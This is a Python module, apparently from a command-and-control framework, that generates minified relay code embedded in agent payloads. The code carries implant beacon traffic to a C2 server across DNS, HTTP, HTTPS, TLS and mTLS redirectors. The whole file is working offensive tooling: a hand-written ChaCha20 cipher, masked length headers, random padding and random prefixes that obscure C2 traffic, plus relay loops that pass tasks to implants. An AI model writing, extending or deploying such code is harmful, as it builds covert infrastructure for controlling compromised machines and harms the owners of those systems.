"""
server/s_modules/agent_base.py — Agent 前置代理公共中继骨架

五个 agent 生成器(agent_dns/http/https/tls/mtls)共享的中继代码：
  帧编解码 E/D/S/R（掩码头 + 0-255 padding + ChaCha20，与 core/crypto 一致）
  256B 首包前缀（混淆；连接 server 时发送、接收植入物连接时吞掉）
  relay_tx(plain)    —— 与 server 一问一答：建连 → 前缀 → 发帧(server_key) →
                        收帧 → 断开，返回明文（DNS/HTTP/HTTPS 每请求一帧用）
  long_lived=True    —— 附加 a2s/s2a 长连接双向循环（TLS/mTLS 植入物长连接用）

中继语义：植入物侧帧由各 agent 监听端用 _AK(agent_key) 解出明文、改 via 后，
交 relay_tx（或 a2s）用 _SK(server_key) 重加密发往 server；响应反向对称。
server 端零改动（beacon 端口仍裸 TCP 帧协议）。
"""


def relay_code(server_key_hex: str, agent_key_hex: str,
               server_host: str, server_port: int, via: str,
               long_lived: bool = False) -> str:
    """返回公共中继代码字符串（短名 minify 风格，嵌入 agent 载荷）。"""
    extra = ""
    if long_lived:
        extra = f'''
def a2s(c,u):
 try:
  _p=b""
  while len(_p)<256:_p+=c.recv(256-len(_p))
  while 1:
   d=R(c,_AK);m=e.loads(d.decode())
   if m.get("type")=="register":m["via"]={via!r}
   S(u,e.dumps(m).encode(),_SK)
 except:pass
def s2a(c,u):
 try:
  while 1:
   d=R(u,_SK);S(c,d,_AK)
 except:pass
'''
    return f'''\
import socket as a,struct as b,zlib as c,json as e,threading as f,secrets as l,hashlib as h,hmac as hm
_SK=bytes({server_key_hex})
_AK=bytes({agent_key_hex})
_SH={server_host!r}
_SP={server_port}
_VIA={via!r}
def Q(s,x,y,z,w):
 s[x]=(s[x]+s[y])&0xffffffff
 s[w]=((s[w]^s[x])<<16|(s[w]^s[x])>>16)&0xffffffff
 s[z]=(s[z]+s[w])&0xffffffff
 s[y]=((s[y]^s[z])<<12|(s[y]^s[z])>>20)&0xffffffff
 s[x]=(s[x]+s[y])&0xffffffff
 s[w]=((s[w]^s[x])<<8|(s[w]^s[x])>>24)&0xffffffff
 s[z]=(s[z]+s[w])&0xffffffff
 s[y]=((s[y]^s[z])<<7|(s[y]^s[z])>>25)&0xffffffff
def B(k,n,ct):
 s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]+list(b.unpack("<8I",k))+[ct]+list(b.unpack("<3I",n))
 w=s[:]
 for _ in range(10):
  Q(w,0,4,8,12);Q(w,1,5,9,13);Q(w,2,6,10,14);Q(w,3,7,11,15)
  Q(w,0,5,10,15);Q(w,1,6,11,12);Q(w,2,7,8,13);Q(w,3,4,9,14)
 return b.pack("<16I",*[(w[i]+s[i])&0xffffffff for i in range(16)])
def X(dat,k,n):
 buf=bytearray();t=0
 for i in range(0,len(dat),64):
  buf+=bytes(u^v for u,v in zip(dat[i:i+64],B(k,n,t)));t+=1
 return bytes(buf)
def E(q,k):
 ek,mk=h.sha256(b"e"+k).digest(),h.sha256(b"m"+k).digest()
 n=l.token_bytes(12);ct=X(c.compress(q),ek,n)
 pl=n+ct+hm.new(mk,n+ct,h.sha256).digest()
 pd=l.token_bytes(l.randbelow(256))
 return pl+pd+bytes([len(pd)])
def D(q,k):
 pd=q[-1];z=q[:-1-pd]
 ek,mk=h.sha256(b"e"+k).digest(),h.sha256(b"m"+k).digest()
 n,ct,tg=z[:12],z[12:-32],z[-32:]
 if not hm.compare_digest(tg,hm.new(mk,n+ct,h.sha256).digest()):raise ValueError("MAC")
 return c.decompress(X(ct,ek,n))
def S(s,d,k):q=E(d,k);s.sendall(b.pack(">I",len(q)^int.from_bytes(h.sha256(k+b"len").digest()[:4],"big"))+q)
def R(s,k):
 r=b""
 while 4-len(r):
  t=s.recv(4-len(r))
  if not t:raise ConnectionError()
  r+=t
 u=b.unpack(">I",r)[0]^int.from_bytes(h.sha256(k+b"len").digest()[:4],"big")
 if u==0:return b""
 v=b""
 while u-len(v):
  w=s.recv(u-len(v))
  if not w:raise ConnectionError()
  v+=w
 return D(v,k)
def relay_tx(p,bid):
 u=a.socket()
 try:
  u.settimeout(30);u.connect((_SH,_SP))
  u.sendall(l.token_bytes(256))
  S(u,e.dumps({{"type":"register","version":2,"role":"beacon","id":bid,"batch":True,"via":_VIA}}).encode(),_SK)
  w=R(u,_SK)  # welcome(掩码帧)
  if p:
   m=e.loads(p.decode())
   if m.get("type")=="register":
    return w if w else b""   # 注册请求: 响应 welcome(R 已解明文, 勿再 D)
   S(u,p,_SK)
  else:
   S(u,e.dumps({{"type":"fetch"}}).encode(),_SK)
  r=R(u,_SK)  # TASKS/PONG(掩码帧)
  return r if r else b""
 finally:
  try:u.close()
  except:pass
{extra}'''
